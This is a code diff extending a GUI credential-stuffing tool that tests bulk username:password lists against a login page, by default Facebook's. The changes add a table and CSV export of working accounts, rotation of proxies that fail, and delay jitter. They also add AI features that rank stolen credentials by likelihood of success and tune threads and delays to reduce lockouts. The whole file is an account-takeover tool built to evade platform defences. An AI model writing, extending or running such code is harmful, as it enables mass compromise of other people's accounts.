@@ -38,7 +38,9 @@ from typing import Optional
 
 try:
     from utils.checker import CheckResult, CredentialChecker, Status, TargetConfig
-    from utils.file_handler import CheckpointManager, CredentialReader, ResultWriter
+    from utils.file_handler import (
+        CheckpointManager, CredentialReader, ResultWriter, SessionResultWriter,
+    )
     from utils.proxy_manager import ProxyManager
     from utils.proxy_filter import (
         ProxyEntry, filter_entries, parse_proxy_text,
@@ -48,6 +50,7 @@ try:
     from utils.ai_filter import (
         init_groq, is_groq_ready, analyze_credentials,
         analyze_proxy_list, ai_suggest_filters,
+        ai_prioritize_credentials, ai_optimize_settings, ai_analyze_failure_patterns,
     )
     _UTILS_OK = True
 except ImportError as _import_err:
@@ -183,6 +186,8 @@ class CredentialTab(ttk.Frame):
         self._stop_event = threading.Event()
         self._stats = {"processed": 0, "working": 0, "invalid": 0, "locked": 0, "2fa": 0, "errors": 0}
         self._lock = threading.Lock()
+        self._start_time: float = 0.0
+        self._session_dir: str = ""
         self._build_ui()
 
     # -- UI ----------------------------------------------------------------
@@ -218,12 +223,12 @@ class CredentialTab(ttk.Frame):
                  text="Comma-separated ISO codes, e.g. US,GB,SG  (filters proxy list by country — FBS is global, main hubs: SG, AU, EU)",
                  font=FONT, bg=BG2, fg=CYAN, wraplength=460, justify=tk.LEFT).pack(side=tk.LEFT, padx=8)
 
-        # Threads / Timeout / Delimiter in a row
+        # Threads / Timeout / Delimiter / Session-folder in a row
         row3 = tk.Frame(ctrl, bg=BG2)
         row3.grid(row=3, column=0, columnspan=3, sticky=tk.W, padx=10, pady=4)
         _ctrl_fields = [("Threads:", "_thr_var", "threads", "10", 5),
                         ("Timeout(s):", "_to_var", "timeout", "10", 5),
-                        ("Delimiter:", "_delim_var", "delimiter", ":", 4)]
+                        ("Delimiter:", "_delim_var", "delimiter", "auto", 6)]
         for lbl, attr, key, default, w in _ctrl_fields:
             tk.Label(row3, text=lbl, font=FONT_BOLD, bg=BG2, fg=FG).pack(side=tk.LEFT, padx=(0, 2))
             var = tk.StringVar(value=str(self._settings.get(key, default)))
@@ -231,9 +236,15 @@ class CredentialTab(ttk.Frame):
             tk.Entry(row3, textvariable=var, bg=BG3, fg=FG, insertbackground=FG,
                      font=FONT, relief=tk.FLAT, width=w).pack(side=tk.LEFT, padx=(0, 12))
 
+        # Session folder checkbox
+        self._session_var = tk.BooleanVar(value=False)
+        tk.Checkbutton(row3, text="Session folder", variable=self._session_var,
+                       bg=BG2, fg=FG, selectcolor=BG3, activebackground=BG2,
+                       activeforeground=FG, font=FONT).pack(side=tk.LEFT, padx=(4, 0))
+
         ctrl.columnconfigure(1, weight=1)
 
-        # Run / Stop / Reset buttons
+        # Run / Stop / Reset / AI Optimize buttons
         btn_row = tk.Frame(self, bg=BG)
         btn_row.pack(pady=4)
         self._run_btn = _btn(btn_row, "▶  Start Checking", self._start, bg=GREEN, fg=BG)
@@ -242,6 +253,10 @@ class CredentialTab(ttk.Frame):
         self._stop_btn.pack(side=tk.LEFT, padx=8)
         self._reset_btn = _btn(btn_row, "🔄  Reset", self._reset, bg=BG3, fg=FG)
         self._reset_btn.pack(side=tk.LEFT, padx=8)
+        self._ai_opt_btn = _btn(btn_row, "🤖  AI Optimize", self._ai_optimize, bg=YELLOW, fg=BG)
+        self._ai_opt_btn.pack(side=tk.LEFT, padx=8)
+        self._export_btn = _btn(btn_row, "📥  Export CSV", self._export_csv, bg=BG3, fg=FG)
+        self._export_btn.pack(side=tk.LEFT, padx=8)
 
         # Progress bar
         self._progress = ttk.Progressbar(self, mode="determinate", length=600)
@@ -260,23 +275,62 @@ class CredentialTab(ttk.Frame):
             lbl.pack(side=tk.LEFT, padx=10)
             self._stat_vars[key] = lbl
 
-        # Main content: log (left) + live response viewer (right) in a paned window
-        pane = tk.PanedWindow(self, orient=tk.HORIZONTAL, bg=BG, sashwidth=6,
-                              sashrelief=tk.RAISED, relief=tk.FLAT)
-        pane.pack(fill=tk.BOTH, expand=True, padx=10, pady=4)
+        # Speed / ETA / Proxy-queue row
+        perf_row = tk.Frame(self, bg=BG)
+        perf_row.pack(pady=1)
+        self._speed_lbl = tk.Label(perf_row, text="Speed: –  |  ETA: –  |  Proxies: –",
+                                    font=FONT, bg=BG, fg=CYAN)
+        self._speed_lbl.pack()
+
+        # Session folder display
+        self._session_lbl = tk.Label(self, text="", font=FONT, bg=BG, fg=YELLOW)
+        self._session_lbl.pack()
+
+        # Main content: live results table (top) + log+viewer (bottom) in a paned window
+        outer_pane = tk.PanedWindow(self, orient=tk.VERTICAL, bg=BG, sashwidth=5,
+                                    sashrelief=tk.RAISED, relief=tk.FLAT)
+        outer_pane.pack(fill=tk.BOTH, expand=True, padx=10, pady=4)
+
+        # --- Live Results Table ---
+        results_frame = tk.Frame(outer_pane, bg=BG)
+        tk.Label(results_frame, text="📋  Live Results", font=FONT_BOLD, bg=BG, fg=ACCENT).pack(anchor=tk.W)
+        cols = ("status", "username", "proxy", "detail", "timestamp")
+        self._results_tree = ttk.Treeview(results_frame, columns=cols, show="headings", height=7)
+        col_widths = {"status": 80, "username": 200, "proxy": 120, "detail": 160, "timestamp": 80}
+        status_icons = {"WORKING": "✔️ WORKING", "INVALID": "❌ INVALID", "LOCKED": "🔒 LOCKED",
+                        "2FA": "📱 2FA", "ERROR": "⚠ ERROR"}
+        for col in cols:
+            self._results_tree.heading(col, text=col.capitalize())
+            self._results_tree.column(col, width=col_widths.get(col, 100), anchor=tk.W)
+        # Tag colours for status
+        self._results_tree.tag_configure("WORKING", foreground=GREEN)
+        self._results_tree.tag_configure("INVALID", foreground=RED)
+        self._results_tree.tag_configure("LOCKED", foreground=YELLOW)
+        self._results_tree.tag_configure("2FA", foreground=CYAN)
+        self._results_tree.tag_configure("ERROR", foreground=RED)
+        tree_scroll = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self._results_tree.yview)
+        self._results_tree.configure(yscrollcommand=tree_scroll.set)
+        self._results_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
+        outer_pane.add(results_frame, minsize=150)
+
+        # --- Bottom pane: log + response viewer ---
+        bottom_pane = tk.PanedWindow(outer_pane, orient=tk.HORIZONTAL, bg=BG, sashwidth=6,
+                                     sashrelief=tk.RAISED, relief=tk.FLAT)
+        outer_pane.add(bottom_pane, minsize=200)
 
         # Left: Live Log
-        log_frame = tk.Frame(pane, bg=BG)
+        log_frame = tk.Frame(bottom_pane, bg=BG)
         tk.Label(log_frame, text="Live Log", font=FONT_BOLD, bg=BG, fg=ACCENT).pack(anchor=tk.W)
         self._log_area = scrolledtext.ScrolledText(
             log_frame, font=FONT_MONO, bg=BG3, fg=FG, insertbackground=FG,
             state=tk.DISABLED, relief=tk.FLAT,
         )
         self._log_area.pack(fill=tk.BOTH, expand=True)
-        pane.add(log_frame, minsize=300, stretch="always")
+        bottom_pane.add(log_frame, minsize=300, stretch="always")
 
         # Right: Live Response Viewer
-        resp_frame = tk.Frame(pane, bg=BG2)
+        resp_frame = tk.Frame(bottom_pane, bg=BG2)
         tk.Label(resp_frame, text="🔍  Live Response Viewer", font=FONT_BOLD, bg=BG2, fg=ACCENT).pack(anchor=tk.W, padx=6, pady=(4, 0))
 
         # Quick single-credential test section
@@ -297,6 +351,17 @@ class CredentialTab(ttk.Frame):
         self._qt_pass_var = tk.StringVar()
         tk.Entry(qt_row2, textvariable=self._qt_pass_var, show="•", bg=BG3, fg=FG,
                  insertbackground=FG, font=FONT_MONO, relief=tk.FLAT, width=22).pack(side=tk.LEFT, padx=2)
+
+        # Paste full line support (user:pass auto-split)
+        qt_row3 = tk.Frame(qtest_frame, bg=BG2)
+        qt_row3.pack(fill=tk.X, padx=4, pady=2)
+        tk.Label(qt_row3, text="Paste:", font=FONT_BOLD, bg=BG2, fg=FG, width=6, anchor=tk.E).pack(side=tk.LEFT)
+        self._qt_line_var = tk.StringVar()
+        qt_line_entry = tk.Entry(qt_row3, textvariable=self._qt_line_var, bg=BG3, fg=FG,
+                                  insertbackground=FG, font=FONT_MONO, relief=tk.FLAT, width=22)
+        qt_line_entry.pack(side=tk.LEFT, padx=2)
+        tk.Label(qt_row3, text="← paste user:pass here", font=FONT, bg=BG2, fg=CYAN).pack(side=tk.LEFT, padx=2)
+        self._qt_line_var.trace_add("write", self._on_qt_line_change)
 
         _btn(qtest_frame, "▶ Test Now", self._quick_test, bg=ACCENT, fg=BG).pack(pady=(2, 4))
 
@@ -322,7 +387,7 @@ class CredentialTab(ttk.Frame):
         )
         self._rv_body.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))
 
-        pane.add(resp_frame, minsize=260, stretch="never")
+        bottom_pane.add(resp_frame, minsize=260, stretch="never")
 
     # -- Callbacks ----------------------------------------------------------
 
@@ -337,6 +402,19 @@ class CredentialTab(ttk.Frame):
                                           filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
         if path:
             self._proxy_var.set(path)
+
+    def _on_qt_line_change(self, *_args):
+        """Auto-split a pasted 'user:pass' line into the User/Pass fields."""
+        line = self._qt_line_var.get().strip()
+        if not line:
+            return
+        # Try common delimiters
+        for delim in (":", "|", ","):
+            parts = line.split(delim, 1)
+            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
+                self._qt_user_var.set(parts[0].strip())
+                self._qt_pass_var.set(parts[1].strip())
+                break
 
     def _log(self, msg: str, colour: str = FG):
         def _do():
@@ -353,6 +431,17 @@ class CredentialTab(ttk.Frame):
             for key, lbl in self._stat_vars.items():
                 display = "2FA" if key == "2fa" else key.upper()
                 lbl.config(text=f"{display}: {s.get(key, 0)}")
+            # Update speed / ETA
+            elapsed = time.time() - self._start_time if self._start_time else 0
+            processed = s.get("processed", 0)
+            speed = processed / elapsed if elapsed > 0 else 0
+            total = self._progress.cget("maximum") or 0
+            remaining = int(total) - processed
+            eta = f"{remaining / speed:.0f}s" if speed > 0 and remaining > 0 else "–"
+            pm_count = getattr(self, "_proxy_manager_count", "–")
+            self._speed_lbl.config(
+                text=f"Speed: {speed:.1f} cred/s  |  ETA: {eta}  |  Proxies left: {pm_count}"
+            )
         self.after(0, _do)
 
     def _update_response_viewer(self, result):
@@ -364,8 +453,13 @@ class CredentialTab(ttk.Frame):
         status_val = result.status.value
         colour = colour_map.get(status_val, FG)
 
+        status_icons = {
+            "working": "✔ WORKING", "invalid": "✘ INVALID",
+            "locked": "🔒 LOCKED", "2fa": "📱 2FA", "error": "⚠ ERROR",
+        }
+
         def _do():
-            self._rv_status.config(text=status_val.upper(), fg=colour)
+            self._rv_status.config(text=status_icons.get(status_val, status_val.upper()), fg=colour)
             self._rv_user.config(text=f"{result.username}:{result.password}")
             self._rv_url.config(text=result.response_url or "–")
             self._rv_detail.config(text=result.detail or "–")
@@ -373,6 +467,29 @@ class CredentialTab(ttk.Frame):
             self._rv_body.delete("1.0", tk.END)
             self._rv_body.insert(tk.END, result.response_body or "(no body captured)")
             self._rv_body.configure(state=tk.DISABLED)
+        self.after(0, _do)
+
+    def _add_result_row(self, result, proxy_used: str = ""):
+        """Add a row to the live results Treeview."""
+        status_val = result.status.value.upper()
+        ts = time.strftime("%H:%M:%S")
+        status_icons = {
+            "WORKING": "✔ WORKING", "INVALID": "✘ INVALID",
+            "LOCKED": "🔒 LOCKED", "2FA": "📱 2FA", "ERROR": "⚠ ERROR",
+        }
+        icon_status = status_icons.get(status_val, status_val)
+
+        def _do():
+            self._results_tree.insert(
+                "", 0,
+                values=(icon_status, result.username, proxy_used or "–",
+                        result.detail or "–", ts),
+                tags=(status_val,),
+            )
+            # Keep at most 500 rows in the table to avoid memory growth
+            children = self._results_tree.get_children()
+            if len(children) > 500:
+                self._results_tree.delete(children[-1])
         self.after(0, _do)
 
     def _start(self):
@@ -386,29 +503,100 @@ class CredentialTab(ttk.Frame):
         self._running = True
         self._stop_event.clear()
         self._stats = {"processed": 0, "working": 0, "invalid": 0, "locked": 0, "2fa": 0, "errors": 0}
+        self._start_time = time.time()
+        self._proxy_manager_count = "–"
         self._run_btn.config(state=tk.DISABLED)
         self._stop_btn.config(state=tk.NORMAL)
         self._reset_btn.config(state=tk.DISABLED)
         self._progress["value"] = 0
+        self._session_lbl.config(text="")
+        # Clear results tree
+        for row in self._results_tree.get_children():
+            self._results_tree.delete(row)
 
         threading.Thread(target=self._run_task, daemon=True).start()
+
+    def _ai_optimize(self):
+        """Run AI optimization: analyze current stats and suggest settings."""
+        if not is_groq_ready():
+            messagebox.showinfo("AI Not Available",
+                                "Connect a Groq API key in the AI Assistant tab first.")
+            return
+        with self._lock:
+            s = dict(self._stats)
+        elapsed = time.time() - self._start_time if self._start_time else 0
+        try:
+            threads = int(self._thr_var.get())
+            delay_val = float(self._settings.get("delay", 0.5))
+        except (ValueError, AttributeError):
+            threads, delay_val = 10, 0.5
+
+        stats_data = {**s, "elapsed_seconds": elapsed,
+                      "current_threads": threads, "current_delay": delay_val,
+                      "proxy_count": getattr(self, "_proxy_manager_count", 0)}
+
+        def _do():
+            try:
+                result = ai_optimize_settings(stats_data)
+                msg_parts = []
+                if "threads" in result:
+                    new_threads = result["threads"]
+                    self._thr_var.set(str(new_threads))
+                    msg_parts.append(f"Threads → {new_threads}")
+                if "message" in result:
+                    msg_parts.append(result["message"])
+                msg = "\n".join(msg_parts) if msg_parts else "No changes recommended."
+                self.after(0, lambda: messagebox.showinfo("AI Optimize", msg))
+                self._log(f"[AI OPTIMIZE] {msg}", YELLOW)
+            except Exception as exc:
+                self.after(0, lambda: messagebox.showerror("AI Error", str(exc)))
+
+        threading.Thread(target=_do, daemon=True).start()
+
+    def _export_csv(self):
+        """Export the live results table to a CSV file."""
+        children = self._results_tree.get_children()
+        if not children:
+            messagebox.showinfo("Empty", "No results to export yet.")
+            return
+        path = filedialog.asksaveasfilename(
+            title="Export results as CSV",
+            defaultextension=".csv",
+            filetypes=[("CSV", "*.csv"), ("All files", "*.*")],
+        )
+        if not path:
+            return
+        import csv
+        try:
+            with open(path, "w", newline="", encoding="utf-8") as fh:
+                writer = csv.writer(fh)
+                writer.writerow(["status", "username", "proxy", "detail", "timestamp"])
+                for iid in children:
+                    writer.writerow(self._results_tree.item(iid, "values"))
+            messagebox.showinfo("Exported", f"Saved {len(children)} rows to:\n{path}")
+        except OSError as exc:
+            messagebox.showerror("Error", str(exc))
+
 
     def _stop(self):
         self._stop_event.set()
         self._log("[INFO] Stop requested – draining workers…", YELLOW)
 
     def _reset(self):
-        """Reset the checker to its initial state (clears log, stats, progress)."""
+        """Reset the checker to its initial state (clears log, stats, progress, results table)."""
         if self._running:
             messagebox.showwarning("Running", "Please stop the checker before resetting.")
             return
         self._stop_event.clear()
+        self._start_time = 0.0
         self._stats = {"processed": 0, "working": 0, "invalid": 0, "locked": 0, "2fa": 0, "errors": 0}
         for key, lbl in self._stat_vars.items():
             display = "2FA" if key == "2fa" else key.upper()
             lbl.config(text=f"{display}: 0")
         self._progress["value"] = 0
         self._progress_lbl.config(text="")
+        self._speed_lbl.config(text="Speed: –  |  ETA: –  |  Proxies: –")
+        self._session_lbl.config(text="")
         self._log_area.configure(state=tk.NORMAL)
         self._log_area.delete("1.0", tk.END)
         self._log_area.configure(state=tk.DISABLED)
@@ -419,6 +607,8 @@ class CredentialTab(ttk.Frame):
         self._rv_body.configure(state=tk.NORMAL)
         self._rv_body.delete("1.0", tk.END)
         self._rv_body.configure(state=tk.DISABLED)
+        for row in self._results_tree.get_children():
+            self._results_tree.delete(row)
         self._run_btn.config(state=tk.NORMAL)
         self._stop_btn.config(state=tk.DISABLED)
         self._reset_btn.config(state=tk.NORMAL)
@@ -443,9 +633,11 @@ class CredentialTab(ttk.Frame):
 
         def _do():
             proxies = proxy_manager.get() if proxy_manager else None
+            proxy_str = list(proxies.values())[0] if proxies else ""
             checker = CredentialChecker(target=TargetConfig(url=url), timeout=timeout, proxies=proxies)
             result = checker.check(username, password)
             self._update_response_viewer(result)
+            self._add_result_row(result, proxy_str)
             colour_map = {
                 "working": GREEN, "invalid": FG, "locked": YELLOW, "2fa": CYAN, "error": RED,
             }
@@ -476,15 +668,29 @@ class CredentialTab(ttk.Frame):
             timeout = int(self._to_var.get())
         except ValueError:
             threads, timeout = 10, 10
-        delim = self._delim_var.get() or ":"
+        delim = self._delim_var.get() or "auto"
         url = self._settings.get("target_url", "https://www.facebook.com/login.php")
 
         reader = CredentialReader(input_file, delimiter=delim)
+        self._log(f"[INFO] Delimiter: '{reader.delimiter}'", CYAN)
         total = reader.count_lines()
         self.after(0, lambda: self._progress.config(maximum=max(1, total)))
         self._log(f"[INFO] Loaded {total} credentials from {input_file}", CYAN)
 
-        writer = ResultWriter()
+        # Session folder support
+        if self._session_var.get():
+            import datetime
+            sname = "results_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            writer: ResultWriter = SessionResultWriter(session_name=sname)
+            session_dir = writer.session_dir  # type: ignore[attr-defined]
+            self._session_dir = session_dir
+            self.after(0, lambda: self._session_lbl.config(
+                text=f"📁 Session: {session_dir}", fg=YELLOW))
+            self._log(f"[OUTPUT] Session folder: {session_dir}", YELLOW)
+        else:
+            writer = ResultWriter()
+            self._session_dir = ""
+
         target = TargetConfig(url=url)
 
         proxy_manager: Optional[ProxyManager] = None
@@ -520,6 +726,8 @@ class CredentialTab(ttk.Frame):
             else:
                 self._log(f"[PROXY] {proxy_manager.count} proxies loaded", CYAN)
 
+        self._proxy_manager_count = proxy_manager.count if proxy_manager else "–"
+
         task_queue: queue.Queue = queue.Queue(maxsize=threads * 4)
         start_time = time.time()
 
@@ -535,8 +743,15 @@ class CredentialTab(ttk.Frame):
                     continue
                 username, password = item
                 proxies = proxy_manager.get() if proxy_manager else None
+                proxy_str = list(proxies.values())[0] if proxies else ""
                 checker = CredentialChecker(target=target, timeout=timeout, proxies=proxies)
                 result = checker.check(username, password)
+
+                # Mark bad proxy on errors
+                if result.status.value == "error" and proxies and proxy_manager:
+                    proxy_manager.mark_bad(proxies)
+                    self._proxy_manager_count = proxy_manager.count
+
                 category = result.status.value
                 writer.write(category, username, password, result.detail)
 
@@ -547,6 +762,7 @@ class CredentialTab(ttk.Frame):
 
                 self._update_stats()
                 self._update_response_viewer(result)
+                self._add_result_row(result, proxy_str)
                 colour_map = {
                     "working": GREEN, "invalid": FG, "locked": YELLOW,
                     "2fa": CYAN, "error": RED,
@@ -564,9 +780,14 @@ class CredentialTab(ttk.Frame):
             t.start()
             workers.append(t)
 
-        for _username, _password in reader.stream():
+        malformed_count = 0
+        for _username, _password, _raw in reader.stream_with_malformed():
             if self._stop_event.is_set():
                 break
+            if _username is None:
+                writer.write_malformed(_raw)
+                malformed_count += 1
+                continue
             # Non-blocking put with stop-check to avoid hanging the feeder thread
             while True:
                 if self._stop_event.is_set():
@@ -589,12 +810,15 @@ class CredentialTab(ttk.Frame):
         elapsed = time.time() - start_time
         with self._lock:
             s = dict(self._stats)
+        malformed_msg = f"  Malformed: {malformed_count}" if malformed_count else ""
         self._log(
             f"\n[DONE] {s['processed']} processed in {elapsed:.1f}s  "
             f"| Working: {s['working']}  Invalid: {s['invalid']}  "
-            f"Locked: {s['locked']}  2FA: {s['2fa']}  Errors: {s['errors']}",
+            f"Locked: {s['locked']}  2FA: {s['2fa']}  Errors: {s['errors']}{malformed_msg}",
             GREEN,
         )
+        if self._session_dir:
+            self._log(f"[OUTPUT] Results in: {self._session_dir}", YELLOW)
 
 
 # ---------------------------------------------------------------------------
@@ -917,9 +1141,11 @@ class AIAssistantTab(ttk.Frame):
                  text=(
                      "When connected, the AI can:\n"
                      "  • Analyse credential patterns and flag suspicious entries\n"
+                     "  • Prioritize credentials most likely to work (before testing)\n"
                      "  • Suggest optimal proxy filters based on your pasted list\n"
                      "  • Provide a plain-language report on any proxy or credential batch\n"
-                     "  • Assist with advanced response classification during credential checking"
+                     "  • Diagnose high failure / lockout rates and suggest fixes\n"
+                     "  • Dynamically optimize thread count & delay (via 🤖 AI Optimize in Checker tab)"
                  ),
                  font=FONT, bg=BG, fg=FG, justify=tk.LEFT).pack(padx=8, pady=6)
 
@@ -936,7 +1162,33 @@ class AIAssistantTab(ttk.Frame):
             cred_frame, font=FONT_MONO, bg=BG3, fg=FG, insertbackground=FG, height=5, relief=tk.FLAT,
         )
         self._cred_box.pack(fill=tk.X, padx=8, pady=4)
-        _btn(cred_frame, "🤖 Analyse Credentials", self._analyse_creds, bg=ACCENT, fg=BG).pack(anchor=tk.W, padx=8, pady=(0, 6))
+        cred_btn_row = tk.Frame(cred_frame, bg=BG)
+        cred_btn_row.pack(anchor=tk.W, padx=8, pady=(0, 6))
+        _btn(cred_btn_row, "🤖 Analyse Credentials", self._analyse_creds, bg=ACCENT, fg=BG).pack(side=tk.LEFT, padx=(0, 6))
+        _btn(cred_btn_row, "🔀 Prioritize (Sort by Likely-Working)", self._prioritize_creds, bg=YELLOW, fg=BG).pack(side=tk.LEFT)
+
+        # Failure diagnosis
+        diag_frame = tk.LabelFrame(self, text=" Failure Diagnosis ", font=FONT_BOLD,
+                                    bg=BG, fg=ACCENT, labelanchor=tk.NW, bd=2, relief=tk.GROOVE)
+        diag_frame.pack(fill=tk.X, padx=10, pady=4)
+        tk.Label(diag_frame,
+                 text="Diagnose high locked/error rates. Fill in the stats from the Checker tab and click Analyse.",
+                 font=FONT, bg=BG, fg=FG, wraplength=700, justify=tk.LEFT).pack(anchor=tk.W, padx=8, pady=(4, 0))
+        diag_row = tk.Frame(diag_frame, bg=BG)
+        diag_row.pack(fill=tk.X, padx=8, pady=4)
+        self._diag_vars: dict = {}
+        for lbl_txt, key, default in [
+            ("Processed:", "processed", "100"), ("Working:", "working", "0"),
+            ("Locked:", "locked", "50"), ("Errors:", "errors", "20"),
+            ("Proxies:", "proxy_count", "10"), ("Threads:", "current_threads", "10"),
+            ("Delay:", "current_delay", "0.5"),
+        ]:
+            tk.Label(diag_row, text=lbl_txt, font=FONT, bg=BG, fg=FG).pack(side=tk.LEFT, padx=(4, 2))
+            var = tk.StringVar(value=default)
+            self._diag_vars[key] = var
+            tk.Entry(diag_row, textvariable=var, bg=BG3, fg=FG, insertbackground=FG,
+                     font=FONT, relief=tk.FLAT, width=6).pack(side=tk.LEFT, padx=(0, 6))
+        _btn(diag_frame, "🔍 Diagnose Failures", self._diagnose_failures, bg=RED, fg=BG).pack(anchor=tk.W, padx=8, pady=(0, 6))
 
         # Proxy analysis
         prx_frame = tk.LabelFrame(self, text=" Proxy List Analysis ", font=FONT_BOLD,
@@ -1020,6 +1272,66 @@ class AIAssistantTab(ttk.Frame):
 
         threading.Thread(target=_do, daemon=True).start()
 
+    def _prioritize_creds(self):
+        """Re-order the pasted credentials by AI-estimated likelihood of working."""
+        if not is_groq_ready():
+            messagebox.showinfo("Not Connected", "Connect a Groq API key first.")
+            return
+        text = self._cred_box.get("1.0", tk.END).strip()
+        if not text:
+            messagebox.showinfo("Empty", "Paste some credentials first.")
+            return
+        pairs = []
+        for line in text.splitlines():
+            line = line.strip()
+            if ":" in line:
+                u, p = line.split(":", 1)
+                pairs.append((u.strip(), p.strip()))
+        if not pairs:
+            messagebox.showinfo("No Credentials", "No valid user:pass pairs found.")
+            return
+        self._show_output("⏳ Prioritising credentials…")
+
+        def _do():
+            try:
+                ordered = ai_prioritize_credentials(pairs)
+                lines = [f"{u}:{p}" for u, p in ordered]
+                display = "\n".join(lines)
+                summary = (
+                    f"✅ Prioritized {len(ordered)} credentials.\n"
+                    f"Top 5 likely-working entries:\n"
+                    + "\n".join(f"  {i+1}. {u}" for i, (u, _) in enumerate(ordered[:5]))
+                    + "\n\n(Full re-ordered list below)\n\n" + display
+                )
+                self.after(0, lambda: self._show_output(summary))
+                self.after(0, lambda: self._cred_box.replace("1.0", tk.END, display + "\n"))
+            except Exception as exc:
+                self.after(0, lambda: self._show_output(f"[ERROR] {exc}"))
+
+        threading.Thread(target=_do, daemon=True).start()
+
+    def _diagnose_failures(self):
+        """Diagnose high failure/lockout rates and suggest fixes."""
+        if not is_groq_ready():
+            messagebox.showinfo("Not Connected", "Connect a Groq API key first.")
+            return
+        try:
+            stats = {k: float(v.get()) if "." in v.get() else int(v.get())
+                     for k, v in self._diag_vars.items()}
+        except (ValueError, AttributeError):
+            messagebox.showwarning("Invalid", "Please enter valid numbers in all fields.")
+            return
+        self._show_output("⏳ Diagnosing…")
+
+        def _do():
+            try:
+                result = ai_analyze_failure_patterns(stats)
+                self.after(0, lambda: self._show_output(result))
+            except Exception as exc:
+                self.after(0, lambda: self._show_output(f"[ERROR] {exc}"))
+
+        threading.Thread(target=_do, daemon=True).start()
+
     def _analyse_proxies(self):
         if not is_groq_ready():
             messagebox.showinfo("Not Connected", "Connect a Groq API key first.")
@@ -1060,7 +1372,8 @@ class SettingsTab(ttk.Frame):
             ("timeout", "Timeout (s)", "10", 8),
             ("retries", "Retries", "2", 8),
             ("delay", "Delay (s)", "0.5", 8),
-            ("delimiter", "Delimiter", ":", 4),
+            ("delay_jitter", "Delay Jitter (s)", "0.3", 8),
+            ("delimiter", "Delimiter (auto or : | , ;)", "auto", 8),
             ("username_field", "Username field", "email", 20),
             ("password_field", "Password field", "pass", 20),
             ("success_redirect", "Success URL contains", "facebook.com", 40),
